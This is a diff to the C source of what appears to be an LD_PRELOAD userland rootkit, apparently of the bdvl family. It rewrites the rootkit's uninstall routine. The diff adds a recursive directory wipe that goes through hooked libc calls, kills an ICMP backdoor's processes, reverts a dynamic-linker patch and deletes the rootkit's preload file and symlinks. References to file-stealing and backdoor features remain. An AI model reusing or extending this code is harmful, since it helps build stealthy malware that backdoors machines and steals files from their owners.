@@ -1,3 +1,33 @@
+void eradicatedir(const char *target){
+    DIR *dp;
+    struct dirent *dir;
+    struct stat pathstat;
+
+    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR, C__XSTAT);
+
+    dp = call(COPENDIR, target);
+    if(dp == NULL) return;
+
+    while((dir = call(CREADDIR, dp)) != NULL){
+        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
+            continue;
+
+        char path[strlen(target)+strlen(dir->d_name)+2];
+        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
+
+        memset(&pathstat, 0, sizeof(struct stat));
+        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
+            if(S_ISDIR(pathstat.st_mode))
+                eradicatedir(path); // we recursive.
+
+        if((long)call(CUNLINK, path) < 0 && errno != ENOENT)
+            printf("Failed unlink on %s\n", path);
+    }
+    closedir(dp);
+    if((long)call(CRMDIR, target) < 0 && errno != ENOENT && errno != ENOTDIR)
+        printf("Failed rmdir on %s\n", target);
+}
+
 #ifdef UNINSTALL_MY_ASS
 void uninstallass(void){
     FILE *fp;
@@ -44,16 +74,21 @@ void uninstallass(void){
 #endif
 
 void uninstallbdv(void){
+#ifdef USE_ICMP_BD
+    if(pdoorup()){
+        printf("Killing ICMP backdoor\n");
+        killrkprocs(readgid()-1);
+    }
+#endif
 #ifdef PATCH_DYNAMIC_LINKER
-    for(int i = 0; i != LDPATHS_SIZE; i++)
-        ldpatch(ldpaths[i], PRELOAD_FILE, OLD_PRELOAD, MAGICUSR);
+    printf("Reverting ld.so\n");
+    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
 #endif
-#ifdef FILE_STEAL
-    eradicatedir(INTEREST_DIR);
-#endif
+    printf("Eradicating directories\n");
     eradicatedir(INSTALL_DIR);
     eradicatedir(HOMEDIR);
 #ifdef UNINSTALL_MY_ASS
+    printf("Uninstalling your ass\n");
     uninstallass();
 #endif
 
@@ -63,16 +98,23 @@ void uninstallbdv(void){
 #ifdef PATCH_DYNAMIC_LINKER
     preloadpath = PRELOAD_FILE;
 #endif
+    printf("Removing preload file\n");
     unlinkr = (long)call(CUNLINK, preloadpath);
     if(unlinkr < 0 && errno != ENOENT)
         printf("Failed removing preload file\n");
 
+    printf("Removing symlink sources\n");
     char *src, *dest;
+    int ulr;
     for(int i = 0; i != LINKSRCS_SIZE; i++){
         src = linksrcs[i];
         dest = linkdests[i];
 
-        if((long)call(CUNLINK, src) < 0 && errno != ENOENT)
+        ulr = (long)call(CUNLINK, src);
+        if(ulr < 0 && errno == EISDIR)
+            eradicatedir(src);
+        else if(ulr < 0 && errno != ENOENT)
             printf("Failed removing %s (%s)\n", src, basename(dest));
     }
+    printf("Done.\n");
 }
